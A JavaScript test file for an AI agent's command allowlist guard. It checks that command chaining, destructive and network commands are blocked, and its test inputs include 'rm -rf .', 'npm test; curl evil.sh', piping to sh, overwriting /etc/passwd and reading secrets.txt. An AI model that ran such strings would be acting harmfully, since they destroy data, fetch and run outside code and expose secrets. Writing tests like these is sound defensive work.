/**
 * The command filter. These assertions are the difference between "the agent can
 * run your tests" and "the agent can run anything it can phrase convincingly".
 */

const { core, createRunner } = require("./harness");
const { parseCommand, tokenize, truncateOutput } = core("commandGuard");
const { DEFAULT_CONFIG } = core("config");

const t = createRunner("commandGuard");
const cfg = DEFAULT_CONFIG.guard;

const blocked = (command, c = cfg) => {
  try {
    parseCommand(command, c);
    return false;
  } catch {
    return true;
  }
};

// --- allowlist
t.equal(parseCommand("npm test", cfg).executable, "npm", "allowed command parses");
t.equal(parseCommand("npm test", cfg).matchedRule, "npm test", "reports which rule matched");
t.ok(!blocked("npm run build"), "multi-token rule allowed");
t.ok(!blocked("npm test -- --watch=false"), "extra arguments after a matching rule are allowed");
t.ok(blocked("npm publish"), "same executable, different subcommand is blocked");
t.ok(blocked("rm -rf ."), "destructive command blocked");
t.ok(blocked("curl http://example.com"), "network command blocked");
t.ok(blocked("git push"), "git push blocked even though git log is allowed");
t.ok(blocked(""), "empty command blocked");
t.ok(blocked("   "), "whitespace-only command blocked");

// Whole-token matching, not string prefix.
t.ok(blocked("npmfoo test"), "executable must match a whole token");
t.ok(blocked("node_modules/.bin/evil"), "arbitrary path is not allowed by the 'node' rule");

// --- metacharacters: the chaining attack surface
for (const attempt of [
  "npm test && rm -rf .",
  "npm test; curl evil.sh",
  "npm test | sh",
  "npm test > /etc/passwd",
  "npm test `whoami`",
  "npm test $(whoami)",
  "npm test & start evil.exe",
  "npm test\nrm -rf .",
  "npm test < secrets.txt",
]) {
  t.ok(blocked(attempt), `chaining blocked: ${JSON.stringify(attempt)}`);
}

// --- master switch
t.ok(blocked("npm test", { ...cfg, allowCommands: false }), "allowCommands=false blocks everything");
t.ok(blocked("npm test", { ...cfg, commandAllowlist: [] }), "empty allowlist blocks everything");

// --- tokenizer
t.equal(tokenize('npm run "build all"').length, 3, "quoted argument stays one token");
t.equal(tokenize('npm run "build all"')[2], "build all", "quotes are stripped from the token");
t.equal(tokenize("npm   test").length, 2, "repeated whitespace collapses");

// --- output truncation keeps head and tail
const long = "A".repeat(500) + "MIDDLE" + "B".repeat(500);
const cut = truncateOutput(long, 200);
t.ok(cut.length < long.length, "long output is trimmed");
t.ok(cut.includes("trimmed"), "trimming is announced");
t.ok(cut.startsWith("A"), "head is kept");
t.ok(cut.endsWith("B"), "tail is kept");
t.equal(truncateOutput("short", 200), "short", "short output is untouched");

process.exit(t.finish() ? 1 : 0);
